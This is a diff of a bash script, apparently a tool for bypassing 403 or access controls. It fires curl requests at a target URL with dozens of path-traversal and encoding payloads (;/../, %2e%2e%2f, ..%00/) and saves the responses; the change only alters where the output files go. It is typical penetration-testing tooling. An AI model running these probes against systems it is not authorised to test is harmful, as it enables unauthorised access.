+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../%2f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../%2f/" -H "$user_agent")
 print
 echo -n "Payload [ ;/../../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../../" -H "$user_agent")
 print
 echo -n "Payload [ ;/../..// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../..//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../..//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../..//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../..//" -H "$user_agent")
 print
 echo -n "Payload [ ;/.././../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.././../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.././../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.././../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.././../" -H "$user_agent")
 print
 echo -n "Payload [ ;/../.;/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../.;/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../.;/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../.;/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../.;/../" -H "$user_agent")
 print
 echo -n "Payload [ ;/..// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//" -H "$user_agent")
 print
 echo -n "Payload [ ;/..//%2e%2e/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2e%2e/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2e%2e/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2e%2e/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2e%2e/" -H "$user_agent")
 print
 echo -n "Payload [ ;/..//%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2f" -H "$user_agent")
 print
 echo -n "Payload [ ;/..//../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//../" -H "$user_agent")
 print
 echo -n "Payload [ ;/../// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..///" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..///" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..///" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..///" -H "$user_agent")
 print
 echo -n "Payload [ ;/../;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/" -H "$user_agent")
 print
 echo -n "Payload [ ;/../;/../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/../" -H "$user_agent")
 print
 echo -n "Payload [ ;/..; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..;" -H "$user_agent")
 print
 echo -n "Payload [ ;/.;. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.;." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.;." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.;." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.;." -H "$user_agent")
 print
 echo -n "Payload [ ;//%2f../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//%2f../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//%2f../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//%2f../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//%2f../" -H "$user_agent")
 print
 echo -n "Payload [ ;//.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//.." -H "$user_agent")
 print
 echo -n "Payload [ ;//../../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//../../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//../../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//../../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//../../" -H "$user_agent")
 print
 echo -n "Payload [ ;///.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///.." -H "$user_agent")
 print
 echo -n "Payload [ ;///../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///../" -H "$user_agent")
 print
 echo -n "Payload [ ;///..// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///..//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///..//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///..//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///..//" -H "$user_agent")
 print
 echo -n "Payload [ ;x ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x" -H "$user_agent")
 print
 echo -n "Payload [ ;x/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x/" -H "$user_agent")
 print
 echo -n "Payload [ ;x; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x;" -H "$user_agent")
 print
-
-
 echo -n "Payload [ & ]: "
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL&" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL&" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL&" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL&" -H "$user_agent")
 print
 echo -n "Payload [ % ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%" -H "$user_agent")
 print
 echo -n "Payload [ %09 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent")
 print
 echo -n "Payload [ ../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL../" -H "$user_agent")
 print
 echo -n "Payload [ ../%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%2f" -H "$user_agent")
 print
 echo -n "Payload [ .././ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.././" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.././" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.././" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.././" -H "$user_agent")
 print
 echo -n "Payload [ ..%00/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/" -H "$user_agent")
 print
 echo -n "Payload [ ..%0d/ ]"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/" -H "$user_agent")
 print
 echo -n "Payload [ ..%5c ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c" -H "$user_agent")
 print
 echo -n "Payload [ ..\ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\\" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\\" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\\" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\\" -H "$user_agent")
 print
 echo -n "Payload [ ..%ff/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff" -H "$user_agent")
 print
 echo -n "Payload [ %2e%2e%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e%2f" -H "$user_agent")
 print
 echo -n "Payload [ .%2e/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.%2e/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.%2e/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.%2e/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.%2e/" -H "$user_agent")
 print
 echo -n "Payload [ %3f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f" -H "$user_agent")
 print
 echo -n "Payload [ %26 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%26" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%26" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%26" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%26" -H "$user_agent")
 print
 echo -n "Payload [ %23 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23" -H "$user_agent")
 print
 echo -n "Payload [ %2e ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e" -H "$user_agent")
 print
 echo -n "Payload [ /. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/." -H "$user_agent")
 print
 echo -n "Payload [ ? ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL?" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL?" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL?" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL?" -H "$user_agent")
 print
 echo -n "Payload [ ?? ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL??" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL??" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL??" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL??" -H "$user_agent")
 print
 echo -n "Payload [ ??? ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL???" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL???" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL???" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL???" -H "$user_agent")
 print
 echo -n "Payload [ // ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//" -H "$user_agent")
 print
 echo -n "Payload [ /./ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/./" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/./" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/./" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/./" -H "$user_agent")
 print
 echo -n "Payload [ .//./ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.//./" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.//./" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.//./" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.//./" -H "$user_agent")
 print
 echo -n "Payload [ //?anything ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//?anything" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//?anything" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//?anything" -H "$user_agent"
